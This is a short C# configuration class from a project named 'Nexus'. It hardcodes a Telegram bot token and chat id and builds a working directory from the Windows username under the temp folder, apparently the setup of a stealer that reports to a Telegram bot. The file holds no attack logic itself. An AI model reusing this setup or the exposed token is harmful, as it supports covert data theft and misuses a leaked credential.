using System;
using System.Security.Principal;
using System.Text;
using System.IO;

namespace Nexus
{
    internal sealed class cConfig
    {
        //Telegram!
        public static string token = "902178466:AAGat7hEqbEpAH_8lShu4tHq4m7WMscCLb4";
        public static string id = "1197139956";

        //Core!

        public static string username = WindowsIdentity.GetCurrent().Name;

        public static string temp = Path.GetTempPath();
        public static string workdir = temp + username;
    }
}
